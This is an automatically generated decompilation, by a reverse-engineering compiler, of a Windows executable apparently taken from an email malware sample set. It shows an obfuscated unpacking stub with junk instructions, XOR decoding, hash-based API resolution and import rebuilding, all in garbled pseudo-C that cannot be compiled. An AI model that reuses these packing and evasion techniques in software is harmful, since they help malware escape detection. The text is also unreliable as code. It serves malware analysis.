/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0634/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401032 - 0x00401054
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401032()
{



    asm("aaa");
    edx :: *(edx + 16779264);
    asm("adc [edx+0x0],edx");
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *edi + bh;
    *eax = *eax & dl;
    *edx = *edx + dh;
    *eax = *eax + 1;
    *edi = *edi + eax + 1;
    esi = 0;
    *eax = *eax + al;
    asm("cli");
}

stack space not deallocated on return
/*	Procedure: 0x00401055 - 0x00401080
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401055()
{



    *%cs:edi+0x7c] = *%cs:edi+0x7c] + ch;
    *(eax + -1644389373) = *(eax + -1644389373) + bh;
    esi = ebx;
    asm("pushf");
    asm("cmc");
    asm("popf");
    edi = 4194304;
    asm("pushf");
    asm("cmc");
    asm("popf");
    ecx = 106496;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("rep movsb");
    asm("pushf");
    asm("cld");
    asm("popf");
    (save)4294132;
    return(0);
}

/*	Procedure: 0x00401081 - 0x004010A6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401081()
{



    asm("out dx,al");
    *(edi + -1711254528) = *(edi + -1711254528) + ch;
    (save)esi;
    *eax = *eax + al;
    asm("in eax,0x0");
    eax = eax - -719323136;
    (restore)ebp;
    *eax = *eax + dh;
    *eax = *eax + al;
    *eax = *eax + al;
    asm("cmc");
    asm("xchg eax,ecx");
    *(edi + 520136704) = *(edi + 520136704) + bh;
    *eax = *eax + al;
    asm("std");
    asm("retf 0xe600");
}

/*	Procedure: 0x004010A7 - 0x004010A8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010A7()
{



    *eax = *eax | al;
}

/* DEST BLOCK NOT FOUND: 00401132 -> 73a5f7b8 */
/*	Procedure: 0x004010A9 - 0x00401428
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    eax = eax >> 21;
    esi = 548142871;
    asm("rol esi,0x7");
    edi = edi >> 13;
    eax = -112;
    asm("ror ecx,0xc");
    edi = esp;
    ecx = -536870881;
    asm("rol ecx,0x3");
    edx = edx + 1;
    edi = edi & ecx;
    ecx = 39837696;
    asm("ror ecx,0x5");
    ecx = ecx + edi;
    esi = esi & ebp;
    edx = *ecx;
    ecx = ecx - ebp;
L004010dc:
    edx = edx + 1;
    edi = ~edi;
    if(*%ss:edx] != eax) {
        asm("rol ecx,0x12");
        if(*%ss:edx] != esi) {
            goto L004010dc;
        }
        edx = edx - 1;
        ecx = 1073741826;
        asm("rol ecx,0x6");
        if(*edx == cl) {
        }
    } else {
        edx = edx + 4;
        ecx = -1073741761;
        asm("rol ecx,0x2");
        while(*edx != cl) {
        }
    }
    edx = ~edx;
    ecx = esp;
    asm("ror ax,0xc");
    esi = *ecx;
    edi = edi + *esp;
    edx = esi + 1;
    esi = 390;
    asm("ror esi,0x1");
    cx = cx + -37;
    if(*%ss:edx] != esi) {
        asm("Unknown opcode 0xc1");
        asm("lock sbb ebp,ebx");
        goto L73a5f7b8;
    }
    asm("o16 test al,0xff");
    *(esi + 965006057) = *(esi + 965006057) >> cl;
    asm("ror cx,0xb");
    esi = esi + -965006009;
    eax = eax - -140114538;
    edi = edi + *esp;
    ecx = 12;
    edx = *%fs:esi] + 12;
    esi = esi - 1;
    eax = *edx;
    asm("ror di,0xf");
    edx = 28;
    cx = cx | -67;
    eax = eax + 28;
    si = si - 20;
    ecx = *eax;
    asm("Unknown opcode 0xc1");
    asm("repne add ecx,[ebx+0xbec08131]");
    asm("sbb al,0x8");
    (restore)ds;
    ecx = ecx - 1263341010;
    esi = esi + 8;
    edi = *esi;
    edx = 9 + esi;
    ecx = ecx & edx;
    esi = esi + 1;
    eax = L00401477(edi, -127500699);
    ax = ax - -82;
    edx = 1818504812;
    (save)108;
    edi = 108 + *esp;
    (save)1818504812;
    asm("ror edx,0xc");
    esi = 1818522734;
    (save)1818522734;
    edi = edi & ebp;
    (save)esp;
    eax = *ecx();
    esp = esp - -12;
    edx = edx ^ edi;
    eax = L00401477(eax, 392494317);
    edx = ecx;
    eax = 0;
    (save)0;
    edi = 0;
    (save)0;
    esi = 0;
    (save)0;
    (save)13695522;
    (save)-308281444;
    (save)702;
    eax = *edx();
    ecx = ecx ^ 1755348187;
    esi = 702;
    asm("rol edi,0x15");
    ds = esi;
    edi = edi ^ 1046865577;
    eax = 1909409;
    cx = cx + -41;
    edx = *L001D22A1;
    edi = edi - 1;
    eax = *edx();
    esi = -1090519181;
    *eax = *eax + (eax & *eax);
    asm("rol ax,0xd");
    ds = esi;
    esi = esi | 1031404873;
    edx = 48;
    asm("rol di,0x2");
    ecx = *%fs:edx];
    eax = eax - ebx;
    edi = *(ecx + 12);
    asm("ror edx,0xc");
    ecx = 28;
    esi = esi + 1447553810;
    edi = edi + 28;
    edx = edx + 1;
    esi = *edi;
    edi = edi ^ 487134414;
    edx = *esi;
    esi = esi + edi;
    eax = *(edx + 8);
    edx = edx ^ 1923905250;
    edi = edi - -1067464542;
    ebp = eax;
    eax = L00401477(eax, 850356788);
    (save)107216;
    edi = 64;
    (save)64;
    *L0000001C();
    ebx = eax;
    *(eax + 106500) = ebp;
    eax = L00401477(ebp, -127500699);
    *(ebx - -106520) = ecx;
    eax = L00401477(ebp, 1116944593);
    edi = ebx + 106528;
    *edi = ecx;
    eax = L00401477(ebp, 1491169839);
    esi = esp + -107;
    (save)esi;
    eax = 64;
    (save)64;
    edi = 4194304;
    eax = *L0040003C + 4194304;
    edi = *(eax + 80);
    (save)edi;
    (save)4194304;
    eax = *ecx();
    esi = 0x401093;
    edi = *L00401093;
    eax = 0;
    asm("pushf");
    asm("cmc");
    asm("popf");
    ecx = 18672;
    asm("pushf");
    asm("wait");
    asm("popf");
    esi = 4194583 + edi;
    al = *esi;
    asm("pushf");
    asm("cld");
    asm("popf");
    if(eax != 0) {
        asm("pushf");
        asm("stc");
        asm("popf");
        al = al ^ 182;
        if(eax != 0) {
            *esi = al;
            asm("pushf");
            asm("stc");
            asm("popf");
        }
        asm("pushf");
        asm("popf");
    }
    esi = esi + 1;
    asm("pushf");
    asm("popf");
    asm("loop 0x40130a");
    asm("pusha");
    edi = ebx;
    eax = 0x401093;
    asm("pushf");
    asm("cmc");
    asm("popf");
    esi = *eax;
    asm("pushf");
    asm("cld");
    asm("popf");
    esi = esi + 4194583;
    asm("pushf");
    asm("cld");
    asm("popf");
    asm("cld");
    dl = 128;
    ebx = 0;
L0040134a:
    *edi = *esi;
    edi = edi + 1;
    asm("pushf");
    asm("cld");
    asm("popf");
    bl = 2;
L00401350:
    eax = L00401429();
    if(esi = esi + 1) {
        goto L0040134a;
    }
    ecx = 0;
    eax = L00401429();
    >= ? L004013a2 : ;
    eax = 0;
    eax = L00401429();
    >= ? L004013bc : ;
    bl = 2;
    asm("pushf");
    asm("cld");
    asm("popf");
    asm("pushf");
    asm("wait");
    asm("popf");
    al = 16;
L00401380:
    asm("wait");
    eax = L00401429();
    asm("adc al,al");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L00401380;
    }
    != ? 0x40141c : ;
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    asm("wait");
    goto L00401350;
    eax = L00401442();
    asm("pushf");
    asm("cld");
    asm("popf");
    if(!(ecx = ecx - ebx)) {
        L0040143D();
        goto L0040140f;
        al = *esi;
        asm("pushf");
        asm("popf");
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L00401459;
        }
        asm("pushf");
        asm("wait");
        asm("popf");
        asm("adc ecx,ecx");
    } else {
        asm("xchg eax,ecx");
        eax = eax - 1;
        asm("pushf");
        asm("stc");
        asm("popf");
        eax = eax << 8;
        al = *esi;
        esi = esi + 1;
        eax = L0040143D();
        if(eax < 32000) {
            if(ah >= 5) {
                goto L00401406;
            }
            if(eax > 127) {
                goto L0040140a;
            }
        }
    }
    asm("pushf");
    asm("wait");
    asm("popf");
    ecx = ecx + 1;
L00401406:
    asm("pushf");
    asm("stc");
    asm("popf");
    ecx = ecx + 1;
L0040140a:
    asm("pushf");
    asm("popf");
    asm("xchg ebp,eax");
L0040140f:
    asm("pushf");
    asm("cmc");
    asm("popf");
    eax = ebp;
    asm("pushf");
    asm("wait");
    asm("popf");
    bl = 1;
    asm("pushf");
    asm("wait");
    asm("popf");
    (save)esi;
    esi = edi - eax;
    asm("rep movsb");
    (restore)esi;
    goto L00401350;
}

/* DEST BLOCK NOT FOUND: 0040142e -> 0040143c */
/*	Procedure: 0x00401429 - 0x0040143C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401429()
{



    asm("pushf");
    asm("cld");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        asm("pushf");
        asm("popf");
        esi = esi + 1;
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x0040143D - 0x00401441
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040143D()
{



    ecx = 0;
    asm("pushf");
    asm("wait");
    asm("popf");
}

stack space not deallocated on return
/*	Procedure: 0x00401442 - 0x00401476
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401442()
{



    asm("pushf");
    asm("popf");
    do {
        L00401429();
        asm("adc ecx,ecx");
        eax = L00401429();
    } while(ecx = ecx + 1);
    return;
    asm("popa");
    asm("pushf");
    asm("cld");
    asm("popf");
    eax = L00401533();
    esi = 0x40105c;
    (save)106496 + ebx;
    ecx = 37;
    asm("rep movsb");
}

/*	Procedure: 0x00401477 - 0x00401532
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 16
 */

L00401477(A14, A18)
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  eax;
	/* unknown */ void  edx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    asm("ror edx,0xe");
    eax = A14;
    edi = eax;
    edx = edx + ebx;
    eax = eax + 27 - -33;
    esi = esi + edx;
    edx = *eax;
    esi = *(eax - -35 - -25 + edx) - -38 + -10 + edi;
    ecx = *esi + edi;
    esi = esi - -4;
    edx = *esi + edi;
    (save) *(esi + 4) + edi;
    (save)ecx;
    asm("xchg edx,ecx");
    edi = A18;
    (save)0;
    eax = A14;
    esi = eax;
    eax = eax + *ecx;
    for(edx = 0; 1; edx = 0) {
        dl = dl + *eax;
        asm("ror edx,0x13");
        edx = edx ^ -180169721;
        eax = eax + 1;
        if(*eax != 0) {
            continue;
        }
        edx = edx ^ edi;
        == ? L0040150b : ;
        ecx = ecx + 4;
        eax = *ecx + esi;
        (restore)edx;
        (save)edx + 1;
    }
    (restore)eax;
    edi = Vfffffffc + (eax << 1);
    edx = ( *edi & 65535) << 2;
    edi = *esp + edx;
    (restore)edx;
    ecx = *edi;
    (restore)eax;
    ecx = ecx + esi;
}

/*	Procedure: 0x00401533 - 0x00401631
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401533()
{



    asm("pusha");
    esi = ebx;
    eax = 100224 + esi;
    for(*(ebx + 106545) = esi; 1; eax = eax + 20) {
        ecx = *(eax + 12);
        if(ecx == 0) {
            break;
        }
        (save)eax;
        (save)ecx;
        *(ebx + 106587) = *(eax - -16);
        edx = *eax;
        *(ebx + 106568) = edx;
        if(edx == 0) {
            edx = *(eax + 16);
        }
        esi = *(ebx + 106545);
        *esp = *esp + esi;
        (restore)ecx;
        edx = edx + esi;
        *(ebx + 106600) = edx;
        (save)edx;
        (save)ecx;
        for(*(ebx + 106609) = *( *(ebx + 106520))(); 1; *(ebx + 106600) = *(ebx - -106600) - -4) {
            ecx = *( *(ebx + 106600));
            if(ecx == 0) {
                break;
            }
            if(!(ecx & -2147483648)) {
                if(!(ecx = ecx + 2)) {
                    goto L004015b9;
                }
                ecx = ecx + *(ebx - -106545);
            } else {
L004015b9:
                ecx = ecx & 2147483647;
            }
            edi = *( *(ebx + 106528))( *(ebx + 106609), ecx);
            edx = *(ebx + 106587);
            *(edx + *(ebx - -106545)) = edi;
            edx = *(ebx + 106587) + 4;
            *(ebx - -106587) = edx;
        }
        (restore)eax;
        (restore)eax;
    }
    asm("popa");
}

/*	Procedure: 0x00401632 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401632()
{



}

/* address  size  */
/* 0x004010a9       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
